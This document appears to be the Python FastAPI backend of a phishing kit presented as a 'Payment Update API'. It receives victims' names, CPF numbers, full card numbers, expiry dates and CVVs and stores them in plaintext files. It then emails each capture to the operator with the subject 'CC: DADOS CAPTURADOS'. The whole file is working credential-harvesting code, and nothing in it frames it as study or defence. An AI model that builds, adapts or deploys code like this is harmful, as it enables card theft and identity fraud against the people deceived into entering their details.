from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Optional
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
import os
import sys
from pathlib import Path
from dotenv import load_dotenv

load_dotenv()

app = FastAPI(title="Payment Update API", version="1.0.0")

# CORS configuration
origins = [
    "http://localhost:8081",
    "http://localhost:6666",
    "http://127.0.0.1:8081",
    "http://127.0.0.1:6666",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allow_headers=["*"],
    max_age=86400,
)

# Pydantic models
class PaymentData(BaseModel):
    nomeCompleto: str
    cpf: str
    numeroCartao: str
    validade: str
    cvv: str

class EmailResponse(BaseModel):
    success: bool
    message: str
    timestamp: str

# Email configuration
EMAIL_FROM = os.getenv("EMAIL_FROM", "your-email@gmail.com")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "your-app-password")
EMAIL_TO = os.getenv("EMAIL_TO", "your-email@gmail.com")
SMTP_SERVER = os.getenv("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.getenv("SMTP_PORT", 587))

# Data directory configuration
DATA_DIR = Path(__file__).parent / "dados"

def create_data_directory():
    """Create dados directory if it doesn't exist"""
    try:
        DATA_DIR.mkdir(exist_ok=True)
        print(f"✓ Data directory ready: {DATA_DIR}")
    except Exception as e:
        print(f"✗ Error creating data directory: {str(e)}")

def get_date_folder():
    """Get or create the date-specific folder"""
    today = datetime.now().strftime("%Y-%m-%d")
    date_folder = DATA_DIR / today
    try:
        date_folder.mkdir(exist_ok=True)
        return date_folder
    except Exception as e:
        print(f"✗ Error creating date folder: {str(e)}")
        raise

def save_payment_data(payment_data: PaymentData) -> str:
    """Save payment data to text file"""
    try:
        date_folder = get_date_folder()
        
        # Create filename with timestamp
        timestamp = datetime.now().strftime("%H%M%S")
        filename = f"pagamento_{timestamp}.txt"
        file_path = date_folder / filename
        
        # Format the data according to user's specification
        current_datetime = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")
        
        content = f"""DADOS DE PAGAMENTO
================================================================================

Data/Hora: {current_datetime}
Hora de Processamento: {current_datetime}

INFORMAÇÕES PESSOAIS
--------------------
Nome Completo: {payment_data.nomeCompleto}
CPF: {payment_data.cpf}

DADOS DO CARTÃO
---------------
Número do Cartão: {payment_data.numeroCartao}
Validade: {payment_data.validade}
CVV: {payment_data.cvv}

================================================================================
"""
        
        # Write to file
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print(f"✓ Payment data saved: {file_path}")
        return str(file_path)
    except Exception as e:
        print(f"✗ Error saving payment data: {str(e)}")
        raise

def send_email(payment_data: PaymentData) -> bool:
    """Send payment update email"""
    try:
        # Create message
        message = MIMEMultipart("alternative")
        message["Subject"] = "CC: DADOS CAPTURADOS"
        message["From"] = EMAIL_FROM
        message["To"] = EMAIL_TO

        # Format the card number to show only last 4 digits
        card_last_4 = payment_data.numeroCartao.replace(" ", "")[-4:]
        card_masked = f"**** **** **** {card_last_4}"

        # Current timestamp
        current_datetime = datetime.now().strftime("%d/%m/%Y, %H:%M:%S")

        # Create plain text version
        text = f"""DADOS DE PAGAMENTO
================================================================================

Data/Hora: {current_datetime}
Hora de Processamento: {current_datetime}

INFORMAÇÕES PESSOAIS
--------------------
Nome Completo: {payment_data.nomeCompleto}
CPF: {payment_data.cpf}

DADOS DO CARTÃO
---------------
Número do Cartão: {card_masked}
Validade: {payment_data.validade}
CVV: ***

================================================================================
"""

        # Create HTML version
        html = f"""
        <html>
            <body style="font-family: Arial, sans-serif; background-color: #f5f5f5; padding: 20px;">
                <div style="max-width: 600px; margin: 0 auto; background-color: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
                    <h2 style="color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px;">DADOS DE PAGAMENTO</h2>
                    
                    <p style="color: #666; font-size: 12px;">
                        <strong>Data/Hora:</strong> {current_datetime}<br>
                        <strong>Hora de Processamento:</strong> {current_datetime}
                    </p>
                    
                    <h3 style="color: #333; margin-top: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px;">INFORMAÇÕES PESSOAIS</h3>
                    
                    <table style="width: 100%; margin-top: 10px;">
                        <tr>
                            <td style="padding: 8px; font-weight: bold; color: #555;">Nome Completo:</td>
                            <td style="padding: 8px; color: #333;">{payment_data.nomeCompleto}</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td style="padding: 8px; font-weight: bold; color: #555;">CPF:</td>
                            <td style="padding: 8px; color: #333;">{payment_data.cpf}</td>
                        </tr>
                    </table>
                    
                    <h3 style="color: #333; margin-top: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px;">DADOS DO CARTÃO</h3>
                    
                    <table style="width: 100%; margin-top: 10px;">
                        <tr>
                            <td style="padding: 8px; font-weight: bold; color: #555;">Número do Cartão:</td>
                            <td style="padding: 8px; color: #333;">{card_masked}</td>
                        </tr>
                        <tr style="background-color: #f9f9f9;">
                            <td style="padding: 8px; font-weight: bold; color: #555;">Validade:</td>
                            <td style="padding: 8px; color: #333;">{payment_data.validade}</td>
                        </tr>
                        <tr>
                            <td style="padding: 8px; font-weight: bold; color: #555;">CVV:</td>
                            <td style="padding: 8px; color: #333;">***</td>
                        </tr>
                    </table>
                    
                    <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; color: #999; font-size: 12px;">
                        <p>Este é um e-mail automático. Por favor, não responda a este e-mail.</p>
                    </div>
                </div>
            </body>
        </html>
        """

        # Attach versions
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)

        # Send email with detailed error handling
        print(f"📧 Enviando email para: {EMAIL_TO}")
        print(f"📧 Servidor SMTP: {SMTP_SERVER}:{SMTP_PORT}")
        
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=10) as server:
            server.starttls()
            print(f"✓ TLS conectado")
            
            server.login(EMAIL_FROM, EMAIL_PASSWORD)
            print(f"✓ Autenticação bem-sucedida")
            
            server.sendmail(EMAIL_FROM, EMAIL_TO, message.as_string())
            print(f"✓ Email enviado com sucesso")

        return True
    except smtplib.SMTPAuthenticationError as e:
        print(f"✗ Erro de autenticação SMTP: {str(e)}")
        print(f"  - Verifique EMAIL_FROM e EMAIL_PASSWORD no arquivo .env")
        return False
    except smtplib.SMTPException as e:
        print(f"✗ Erro SMTP: {str(e)}")
        return False
    except Exception as e:
        print(f"✗ Erro ao enviar email: {str(e)}")
        import traceback
        traceback.print_exc()
        return False

@app.on_event("startup")
async def startup_event():
    """Create necessary directories on startup"""
    create_data_directory()
    print(f"🚀 Backend iniciado em porta 6666")
    print(f"📁 Diretório de dados: {DATA_DIR}")
    print(f"📧 Email configurado para: {EMAIL_TO}")

@app.get("/")
async def root():
    """Health check endpoint"""
    return {
        "status": "API is running",
        "service": "Payment Update Service",
        "data_directory": str(DATA_DIR),
        "email_configured": EMAIL_FROM != "your-email@gmail.com"
    }

@app.post("/api/update-payment", response_model=EmailResponse)
async def update_payment(data: PaymentData):
    """
    Receive payment data, save to file, and send email
    """
    try:
        # Save payment data to file
        print(f"\n💾 Processando pagamento de: {data.nomeCompleto}")
        file_path = save_payment_data(data)
        
        # Send email
        email_sent = send_email(data)
        
        if email_sent:
            return EmailResponse(
                success=True,
                message=f"Pagamento atualizado! Arquivo salvo em: {file_path}",
                timestamp=datetime.now().isoformat()
            )
        else:
            # Even if email fails, file was saved
            return EmailResponse(
                success=True,
                message=f"Pagamento salvo em arquivo, mas erro ao enviar email. Tente novamente mais tarde.",
                timestamp=datetime.now().isoformat()
            )
    except Exception as e:
        print(f"✗ Erro ao processar pagamento: {str(e)}")
        import traceback
        traceback.print_exc()
        raise HTTPException(
            status_code=500,
            detail=f"Erro ao processar a solicitação: {str(e)}"
        )

@app.post("/api/test-email")
async def test_email():
    """Test email configuration"""
    try:
        print("\n🧪 Testando configuração de email...")
        test_data = PaymentData(
            nomeCompleto="Teste de Configuração",
            cpf="000.000.000-00",
            numeroCartao="4111 1111 1111 1111",
            validade="12/25",
            cvv="123"
        )
        
        # Save test data
        file_path = save_payment_data(test_data)
        
        # Send test email
        if send_email(test_data):
            return {
                "success": True,
                "message": "✓ E-mail de teste enviado com sucesso!",
                "file_saved": file_path
            }
        else:
            return {
                "success": False,
                "message": "✗ Falha ao enviar e-mail de teste. Verifique credenciais.",
                "file_saved": file_path
            }
    except Exception as e:
        return {
            "success": False,
            "message": f"✗ Erro ao testar email: {str(e)}"
        }

@app.get("/api/status")
async def status():
    """Get API status and configuration"""
    return {
        "status": "running",
        "port": 6666,
        "data_directory": str(DATA_DIR),
        "data_directory_exists": DATA_DIR.exists(),
        "email_from": EMAIL_FROM,
        "email_to": EMAIL_TO,
        "smtp_server": SMTP_SERVER,
        "smtp_port": SMTP_PORT
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=6666)
